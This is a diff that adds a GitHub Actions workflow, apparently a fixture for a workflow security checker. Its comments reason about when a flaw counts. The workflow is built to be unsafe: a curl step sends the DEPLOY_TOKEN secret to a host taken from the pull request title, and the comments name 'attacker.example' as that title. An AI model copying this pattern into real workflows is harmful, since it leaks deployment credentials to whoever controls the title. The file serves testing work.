@@ -1,0 +1,29 @@
+# situation: on pull_request, a step sends a request with curl and the
+#   secret DEPLOY_TOKEN to the host the pull request's title names.
+# reason: when only the pull requests of the repository run the workflow, the
+#   author of the pull request can change the workflow itself and gets what the
+#   run has without the flaw, so the flaw adds nothing to what the author gets;
+#   when a ruleset of the organization or the enterprise runs the workflow on
+#   the pull requests of its other repositories, the author cannot change the
+#   workflow, and what the run of the ruleset has beyond the author's own
+#   pull_request workflow is not known. The workflow does not say which case
+#   holds.
+# cause: pull_request is none of the attacker's events the rule reads. The
+#   rule does not read whether a ruleset runs the workflow.
+# attack: the author of a pull request from a fork titles the pull request
+#   attacker.example.
+# attack-run-behavior: the run of a pull request from a fork gets no secret,
+#   so curl sends an empty header; the author could change the workflow anyway.
+#   When a ruleset of the organization runs the workflow on a pull request of
+#   another repository, the same steps run in the run of the ruleset; what the
+#   run of the ruleset has was not observed, so whether the steps do harm in the
+#   run of the ruleset is not known.
+on: pull_request
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.pull_request.title }}/status"
